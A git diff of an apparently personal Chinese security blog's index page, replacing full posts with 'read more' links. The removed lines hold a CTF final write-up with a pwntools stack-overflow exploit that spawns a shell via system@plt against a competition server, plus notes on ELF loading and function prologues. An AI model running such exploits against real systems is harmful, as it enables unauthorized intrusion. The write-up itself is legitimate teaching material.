@@ -169,10 +169,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-11-29 19:01:45 / 修改時間：19:22:54" itemprop="dateCreated datePublished" datetime="2020-11-29T19:01:45+08:00">2020-11-29</time>
+              <time title="創建時間：2020-11-29 19:01:45" itemprop="dateCreated datePublished" datetime="2020-11-29T19:01:45+08:00">2020-11-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:58:33" itemprop="dateModified" datetime="2021-01-22T18:58:33+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -185,39 +191,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="2020-資安技能金盾獎-決賽-WriteUp-amp-心得"><a href="#2020-資安技能金盾獎-決賽-WriteUp-amp-心得" class="headerlink" title="2020 資安技能金盾獎 決賽 WriteUp &amp; 心得"></a>2020 資安技能金盾獎 決賽 WriteUp &amp; 心得</h1><h2 id="心得寫在前"><a href="#心得寫在前" class="headerlink" title="心得寫在前"></a>心得寫在前</h2><h3 id="10-17-初賽"><a href="#10-17-初賽" class="headerlink" title="10/17 初賽"></a>10/17 初賽</h3><p>這是我第一次參加金盾獎 @_@<br>初賽的題目總共是四題，競賽時間是兩小時，然後我想抱怨一下:</p>
-<p>官網寫包含很多類別，其中有Misc, 但其實每題都是Misc= = (+forensics)</p>
-<p>然後工作人員好像自己也不太懂(?)，好這不重要，反正題目幾乎都是鑑識，我不會QQ</p>
-<p>只解了第一題就進決賽xD</p>
-<h3 id="10-20-決賽"><a href="#10-20-決賽" class="headerlink" title="10/20 決賽"></a>10/20 決賽</h3><p>其實當初沒有想到會進決賽，想當然爾，我們是墊底進的Orz</p>
-<p>今年的題目有所謂的 “教學題”，就是直接提供解法，但會扣分(400 -&gt; 100)</p>
-<p>似乎是怕有人會掛蛋嘛XDDDD</p>
-<p>賽中出題者好像不太懂分類(?)，把Web出到Pwn去，然後Reverse = Pwn</p>
-<p>……..</p>
-<p>最後我們燒雞，我解出一題(唯一的)PWN(假Reverse)，然後隊友開了<code>Crypto_教學題</code>的題示</p>
-<p>然後就拿到第三了XDD，直接拿一萬回家</p>
-<h2 id="決賽題解"><a href="#決賽題解" class="headerlink" title="決賽題解"></a>決賽題解</h2><p>這次我唯一解出的題目是 <code>Reverse_教學題</code></p>
-<p>雖說是reverse啦，但看題敘可以明顯看出是有關Buffer Overflow，我引用一小段:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...小明發現輸入過長的資料會導致 Segmentation Fault...</span><br></pre></td></tr></table></figure>
-
-<p>看到這邊大概就有底了，然後再打開Binary:</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/csc_2020$ checksec ./check_passwd</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/csc_2020/check_passwd&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>開了NX, 沒開Canary，很明顯是要stack overflow，接著看組語:</p>
-<h4 id="Disassembly"><a href="#Disassembly" class="headerlink" title="Disassembly"></a>Disassembly</h4><p>main函數:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  checkInfo();</span><br><span class="line">  system(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>呼叫了<code>checkInfo()</code>, 接著就<code>exit</code>，注意這邊用了<code>system()</code>，所以心理可以有個底要做<code>ret2plt</code></p>
-<p>接著追進<code>checkInfo()</code>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">10</span>]; <span class="comment">// [esp+16h] [ebp-412h]</span></span><br><span class="line">  <span class="keyword">char</span> account[<span class="number">1024</span>]; <span class="comment">// [esp+20h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(account, <span class="number">0</span>, <span class="keyword">sizeof</span>(account));</span><br><span class="line">  *(_DWORD *)password = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input account: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fgets(account, <span class="number">10240</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(account, <span class="number">64</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;account is : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(account);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;account failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input password: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fgets(password, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(password, <span class="string">&quot;123456&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;password is : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(password);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;password failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>這邊可以看到<code>password[10]</code>, <code>account[1024]</code>，但<code>fgets()</code>讀了10240，明顯的buffer overflow</p>
-<p>那這樣就很清楚了，用buffer overflow蓋掉return address指向<code>system@plt</code>，接著布置參數就好</p>
-<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>solve.py:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib.elf</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./check_passwd&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./check_passwd&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;10.3.202.18&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">1036</span></span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += p32(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.search(<span class="string">&#x27;sh&#x27;</span>).next())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;A&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-
-<p>沒錯就是這麼簡短，整個解題過程用不到十分鐘= =</p>
-
+          <h1 id="2020-資安技能金盾獎-決賽-WriteUp-amp-心得"><a href="#2020-資安技能金盾獎-決賽-WriteUp-amp-心得" class="headerlink" title="2020 資安技能金盾獎 決賽 WriteUp &amp; 心得"></a>2020 資安技能金盾獎 決賽 WriteUp &amp; 心得</h1><h2 id="心得寫在前"><a href="#心得寫在前" class="headerlink" title="心得寫在前"></a>心得寫在前</h2><h3 id="10-17-初賽"><a href="#10-17-初賽" class="headerlink" title="10/17 初賽"></a>10/17 初賽</h3><p>這是我第一次參加金盾獎 @_@</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/Golden-Shield-Final/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -259,10 +241,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-29 22:21:20 / 修改時間：23:05:57" itemprop="dateCreated datePublished" datetime="2020-10-29T22:21:20+08:00">2020-10-29</time>
+              <time title="創建時間：2020-10-29 22:21:20" itemprop="dateCreated datePublished" datetime="2020-10-29T22:21:20+08:00">2020-10-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:58:05" itemprop="dateModified" datetime="2021-01-22T18:58:05+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -277,55 +265,14 @@
       
           <h1 id="關於Linux-ELF-Loader"><a href="#關於Linux-ELF-Loader" class="headerlink" title="關於Linux ELF Loader"></a>關於Linux ELF Loader</h1><h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>在程式執行開始之前，shell會做<code>execve()</code>以及<code>fork()</code>來啟動程式</p>
 <p>接著程式就會被映射到記憶體上，然後開始接下來的一串動作:</p>
-<ol>
-<li>找<code>PT_INTERP</code> segment</li>
-<li>map <code>text</code>, <code>data</code>, 其中<code>text</code>在lower address</li>
-<li>載入<code>ld.so</code>, 映射到記憶體(process memory)</li>
-<li>分配<code>Bss</code></li>
-<li>跳轉到OEP, 大多數程式應該都是<code>_start</code></li>
-</ol>
-<p>然後那隻被<code>execve()</code>的程式這時候才真的開始做事XD</p>
-<p>先寫一隻比較簡單的程式並看看在<code>_start</code>之後又是怎麼跳轉到<code>main()</code>的:</p>
-<p>就寫一隻hello world:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[] = <span class="string">&quot;Hell  World!!~~~~&quot;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然後編譯，直接拖到IDA裡面F5看pseudo code(方便拉XD)</p>
-<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><code>_start</code>函數長的大概是這樣:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx         ; rtld_fini</span><br><span class="line">pop     rsi             ; argc</span><br><span class="line">mov     rdx, rsp        ; ubp_av</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp             ; stack_end</span><br><span class="line">lea     r8, __libc_csu_fini ; fini</span><br><span class="line">lea     rcx, __libc_csu_init ; init</span><br><span class="line">lea     rdi, main       ; main</span><br><span class="line">call    cs:__libc_start_main_ptr</span><br><span class="line">hlt</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 1050</span><br><span class="line">_start endp</span><br></pre></td></tr></table></figure>
-
-<p>可以看到大概是先把命令列<code>argc</code>放去<code>rsi</code>，接著保存了<code>RAX</code>, <code>RSP</code>, 接著把<code>__libc_csu_fini</code>, <code>__libc_csu_init</code>放到<code>r8</code>和<code>rcx</code>, 然後把<code>main</code>放到<code>rdi</code>, 也就是第一個參數 (所以這邊整個是一個calling convention這樣)</p>
-<p>然後他就呼叫了<code>__libc_start_main_ptr</code>, 追進去之後發現是一個外部函數，那就可以去libc裡面看</p>
-<h3 id="libc-start-main"><a href="#libc-start-main" class="headerlink" title="libc_start_main"></a>libc_start_main</h3><p>GNU libc裡面的<code>__libc_start_main</code>大概長這樣:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="keyword">int</span></span><br><span class="line">LIBC_START_MAIN (<span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">		 <span class="keyword">int</span> argc, <span class="keyword">char</span> **argv,</span><br><span class="line">		 __typeof (main) init,</span><br><span class="line">		 <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">		 <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line">  __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line">  <span class="keyword">if</span>(fini)</span><br><span class="line">    __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">...............</span><br><span class="line">      <span class="keyword">if</span> (! atomic_decrement_and_test (ptr))&#123;</span><br><span class="line">	__exit_thread ();</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因為原始的code太長了，把她精簡一下，刪掉那些沒用的<code>#ifdef</code>, <code>#endif</code>之後，可以看到他會先呼叫<code>__libc_init_first</code>, 接著register <code>fini</code>, 然後跳轉到<code>init</code>, 最後才呼叫 <code>main(argc, argv, envp)</code>, 然後保存result並以這個結果<code>exit()</code></p>
-<p>接下來看<code>__libc_init_first</code></p>
-<h3 id="libc-init-first"><a href="#libc-init-first" class="headerlink" title="libc_init_first"></a>libc_init_first</h3><p>去掉垃圾之後大概只剩下:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br></pre></td></tr></table></figure>
-
-<p>這樣了XDD，反正就是跳到<code>init</code>上面，然後初始化</p>
-<p>接著延續在<code>__libc_start_main</code>的東西，我們可以知道他會跳轉到<code>__libc_csu_init</code>上面執行，最後執行<code>main(argc, argv, envp)</code>, <code>exit(result)</code></p>
-<h3 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="libc_csu_init"></a>libc_csu_init</h3><p>大概是長這樣:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _libc_csu_init(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  init_proc();</span><br><span class="line">  v4 = &amp;_do_global_dtors_aux_fini_array_entry - &amp;_frame_dummy_init_array_entry;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD, __int64, __int64))*(&amp;_frame_dummy_init_array_entry + v5++))(a1, a2, v3);</span><br><span class="line">    <span class="keyword">while</span> ( v4 != v5 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就是呼叫了<code>init_proc</code>, 接著呼叫<code>init_array</code>上面的東西來完成程式初始化</p>
-<p>接下來是<code>init_proc</code></p>
-<h3 id="init-proc"><a href="#init-proc" class="headerlink" title="init_proc"></a>init_proc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 (**init_proc())(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (**result)(<span class="keyword">void</span>); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;_gmon_start__;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;_gmon_start__ )</span><br><span class="line">    result = (__int64 (**)(<span class="keyword">void</span>))_gmon_start__();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就是呼叫了<code>gmon_start</code></p>
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>看完之後大概整理程式啟動流程如下:</p>
-<ol>
-<li>找<code>PT_INTERP</code> segment</li>
-<li>map <code>text</code>, <code>data</code>, 其中<code>text</code>在lower address</li>
-<li>載入<code>ld.so</code>, 映射到記憶體(process memory)</li>
-<li>分配<code>Bss</code></li>
-<li>跳轉到OEP, 大多數程式應該都是<code>_start</code></li>
-<li>進去<code>_start</code>之後她幫你呼叫<code>__libc_start_main</code></li>
-<li><code>__libc_start_main</code>呼叫init array完成初始化然後呼叫<code>__libc_csu_init</code></li>
-<li>終於執行<code>main(argc, argv, envp)</code>然後保存狀態<code>exit()</code></li>
-</ol>
-<p>關於Glibc source code:<br><a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/master/csu/libc-start.c">https://github.com/lattera/glibc/blob/master/csu/libc-start.c</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/archives/Loader/#more" rel="contents">
+                閱讀全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -367,10 +314,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
-              
 
-              <time title="創建時間：2020-10-28 19:44:09 / 修改時間：20:01:58" itemprop="dateCreated datePublished" datetime="2020-10-28T19:44:09+08:00">2020-10-28</time>
+              <time title="創建時間：2020-10-28 19:44:09" itemprop="dateCreated datePublished" datetime="2020-10-28T19:44:09+08:00">2020-10-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-22 18:56:43" itemprop="dateModified" datetime="2021-01-22T18:56:43+08:00">2021-01-22</time>
+              </span>
 
           
 
@@ -388,116 +341,15 @@
 <ol>
 <li>在stack上保存現在這個stack frame的base poiner(例如RBP)</li>
 <li>將base pointer對準stack address pointer(例如RSP)</li>
-<li>分配stack空間</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp, rsp</span><br><span class="line">sub rsp, $offset</span><br></pre></td></tr></table></figure>
-
-<h2 id="Function-Epilogue"><a href="#Function-Epilogue" class="headerlink" title="Function Epilogue"></a>Function Epilogue</h2><p>也是一個寫法上的規定，是函數結束時需要做的事(ex.回收stack之類的)，配合Prologue, 可以讓程式執行時為各函數分配stack空間，也不會互相損毀各自的stack frame</p>
-<h3 id="Implemetation"><a href="#Implemetation" class="headerlink" title="Implemetation"></a>Implemetation</h3><p>基本上是將Prologue的流程反過來執行一次:</p>
-<ol>
-<li>將stack address pointer對準base pointer</li>
-<li>恢復舊的stack base</li>
-<li>ret</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>而在x86架構下，有個更精簡的寫法:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>就是利用<code>leave</code> 代替了<code>mov rsp, rbp; pop rbp;</code></p>
-<h2 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h2><p>既然寫了prologue, epilogue，那就順便寫寫<code>call</code>/<code>ret</code>好了</p>
-<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><p>是用來呼叫函數使用的instruction, 主要做兩件事:</p>
-<ol>
-<li>保存現在的Instruction pointer, 等下才可以return</li>
-<li>將Instruction pointer設成目標函數 (相當於jmp)</li>
-</ol>
-<h4 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rip</span><br><span class="line">jmp $target</span><br></pre></td></tr></table></figure>
-
-<p>注意其實沒有<code>push rip</code>這個寫法，只是為了表示用，控制流程只能用<code>call/ ret/ jxx</code></p>
-<h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><h4 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h4><p>在函數執行完畢返回時所執行的Instruction, 只會做一件事:</p>
-<p>將保存在現在stack頂部(因為已經在epilogue末尾，base pointer已經被取走了)的return address 設成Instruction pointer</p>
-<h4 id="Implementation-2"><a href="#Implementation-2" class="headerlink" title="Implementation"></a>Implementation</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure>
-
-<p>同樣也是為了表示才用<code>pop rip</code>這種寫法 (這是不合法的)</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/About-Format-String/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="wh0am1">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wh0am1's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/archives/About-Format-String/" class="post-title-link" itemprop="url">About Format String</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">發表於</span>
-              
-
-              <time title="創建時間：2020-10-18 19:15:52 / 修改時間：19:38:22" itemprop="dateCreated datePublished" datetime="2020-10-18T19:15:52+08:00">2020-10-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
